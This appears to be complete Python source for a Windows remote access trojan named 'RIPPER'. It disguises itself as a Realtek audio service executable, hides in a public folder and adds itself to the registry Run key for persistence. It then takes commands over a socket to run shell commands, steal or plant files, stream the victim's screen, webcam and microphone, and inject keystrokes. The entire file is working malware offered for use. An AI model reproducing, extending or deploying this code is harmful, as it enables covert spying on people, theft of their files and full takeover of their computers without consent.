from vidstream import ScreenShareClient;
from vidstream import CameraClient;
from vidstream import AudioSender;
import winreg as reg, subprocess;
import socket, os, sys, time;
import keyboard;
import base64;

global addr;
addr = '127.0.0.1', 4444;
server_name = 'server.exe';
camouflage_name = 'Realtek High Definition Audio Services.exe';
camouflage_rex = 'Realtek Audio Services';

def camouflage():
    cwd = os.getcwd();
    if cwd != "C:\\Users\\Public\\Libraries":
        os.system(f"move {server_name} C:\\Users\\Public\\Libraries");
        os.chdir('C:\\Users\\Public\\Libraries');
        cwd = os.getcwd();
        try:
            os.rename(f'{server_name}', f'{camouflage_name}.exe');
        except Exception:
            pass;
        address=os.path.join('', '{}'.format(camouflage_name)); 
        key = reg.HKEY_CURRENT_USER;
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS);
        reg.SetValueEx(open, camouflage_rex, 0, reg.REG_SZ, address) ;
        reg.CloseKey(open);
    
def AddToStartup(f_name, path): 
    address=os.path.join(path, f_name); 
    key = reg.HKEY_CURRENT_USER;
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS);
    reg.SetValueEx(open, "Microsoft_Romans", 0, reg.REG_SZ, address) ;
    reg.CloseKey(open);
    
def connect():       
    cwd = os.getcwd();
    camouflage();
    os.chdir("C:\\Users\\Public\\Libraries");
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
    connected = False;
    while (connected == False):
        try:
            s.connect(addr);
        except ConnectionRefusedError:
            connect();
        connected = True;
        cwd = os.getcwd();
        s.send(("dir: " + str(cwd)).encode('utf-8', errors='ignore'));
    while True:
        try:
            command = s.recv(2048).strip().decode('utf-8', errors='ignore');
            if 'terminate' in command:
                s.close();
                break;
            elif command.startswith('startup'):
                file_name = command[8:];
                pth = os.getcwd();
                try:
                    AddToStartup(file_name, pth);
                    s.send("[RIPPER] Added with sucess".encode('utf-8'));
                except Exception:
                    connect();
                    s.send('[RIPPER] Erro to add file in stratup'.encode('utf-8', errors='ignore'));
            elif 'send' in command:
                file_name = s.recv(1024).decode('utf-8');
                s.send('[RIPPER] Connection: OK'.encode('utf-8', errors='ignore'));
                file_size = s.recv(1024).decode('utf-8');
                s.send('[RIPPER] Starting transference: OK'.encode('utf-8', errors='ignore'));
                command = '';
                with open(file_name, "wb") as file:
                    c = 0
                    start_time = time.time();
                    while c < int(file_size):
                        data = s.recv(1024);
                        if not (data):
                            break;
                        file.write(data);
                        c += len(data);
                    end_time = time.time();
                s.send(("dir:" + str(cwd)).encode('utf-8', errors='ignore'));
                pass;
            elif command.startswith('get '):
                file_name = command[4:];
                file_size = os.path.getsize(file_name);
                s.send(file_name.encode('utf-8'));
                s.send(str(file_size).encode('utf-8'));
                with open(file_name, "rb") as file:
                    c = 0;
                    start_time = time.time();
                    while c < int(file_size):
                        data = file.read(1024);
                        if not (data):
                            break;
                        s.sendall(data);
                        c += len(data);
                    end_time = time.time();
                pass;
                time.sleep(3);
                s.send(("dir:" + str(cwd)).encode('utf-8', errors='ignore'));
            elif command.startswith('screen'):
                client = ScreenShareClient(addr[0], 9999);
                client.start_stream();
                s.send('[RIPPER]  Viewing the target screen'.encode('utf-8', errors='ignore'));
            elif command.startswith('cam'):
                client1 = CameraClient(addr[0], 9998);
                client1.start_stream();
                s.send('[RIPPER]  Viewing the target cam'.encode('utf-8', errors='ignore'));
            elif command.startswith('mic'):
                client2 = AudioSender(addr[0], 9997);
                client2.start_stream();
                s.send("[RIPPER]  Listening to the target's microphone".encode('utf-8', errors='ignore'));
            elif command.startswith('open link '):
                link = command[10:];
                if link[:8] == 'https://':
                    pass;
                else:
                    link = f'https://{link}';
                os.system(f'start {link}');
                s.send("[RIPPER]  Opened link in target browser".encode('utf-8', errors='ignore'));
            elif command.startswith('keyboard type'):
                keyboard.write(f'{command[14:]}');
                s.send(f"[RIPPER]  {command[14:]} Was entered successfully".encode('utf-8', errors='ignore'));
            elif command.startswith('keyboard control'):
                s.send(f"[RIPPER]  Are you controlling the keyboard now, press insert to stop.".encode('utf-8', errors='ignore'));
                while True:
                    key = s.recv(1024).decode('utf-8');
                    key = key.replace("'","");
                    if key == 'stop':
                        break;
                    keyboard.press(key);
                    keyboard.release(key);
                    key = s.recv(1024).decode('utf-8');
            elif command.startswith('cd '):
                dir = command[3:];
                try:
                    os.chdir(dir);
                except:
                    os.chdir(cwd);  
                cwd = os.getcwd();
                s.send(("dir: " + str(cwd)).encode('utf-8', errors='ignore'));
            else:
                CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);
                out = CMD.stdout.read();
                if out == "b''" or out == b'':
                    s.send(("dir: " + str(cwd)).encode('utf-8', errors='ignore'));
                err = CMD.stderr.read();
                s.send(out);
                s.send(err);
        except Exception:
            connect();
            s.send('[RIPPER] Error'.encode('utf-8', errors='ignore'));
      
connect();
connected = False;
while (not connected):
    try:
        connect();
        connected = True;
    except:
        print(".", end = "");
